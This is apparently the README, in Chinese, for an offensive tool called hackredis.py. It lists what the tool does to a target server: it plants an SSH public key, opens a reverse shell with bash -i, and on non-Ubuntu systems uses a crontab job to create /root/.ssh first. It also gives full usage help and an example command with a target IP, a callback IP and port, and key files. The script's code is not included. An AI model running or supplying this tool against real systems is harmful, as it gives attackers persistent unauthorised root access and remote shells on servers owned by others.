### 0x01 脚本功能
1. 写入ssh公钥
2. 反弹shell
3. 如果没有.ssh目录，非ubuntu系统利用crontab定时任务新建/root/.ssh目录，再写公钥、反弹shell
4. 如果没有/root/.ssh/目录，该脚本不支持ubuntu系统，所以反弹shell使用了bash -i，导致也无关紧要

### 0x02 脚本用法

脚本用法
```
usage: hackredis.py [-h] [-t TARGET_IP] [-sp SSH_PORT] [-rsi REBOUND_SHELL_IP]
                    [-rsp REBOUND_SHELL_PORT] [-pubkey SSH_PUBLIC_KEYFILE]
                    [-prikey SSH_PRIVATE_KEYFILE]

For Example:
-----------------------------------------------------------------------------
python hackredis.py -t 123.56.11.22 -sp 22 -rsi x.x.x.x -rsp 5555 -pubkey
ssh_public_key -prikey ssh_private_key

optional arguments:
  -h, --help            show this help message and exit
  -t TARGET_IP          target ip
  -sp SSH_PORT          ssh port to login ssh
  -rsi REBOUND_SHELL_IP
                        rebound shell ip
  -rsp REBOUND_SHELL_PORT
                        rebound shell port
  -pubkey SSH_PUBLIC_KEYFILE
                        ssh public key file
  -prikey SSH_PRIVATE_KEYFILE
                        ssh private key file
```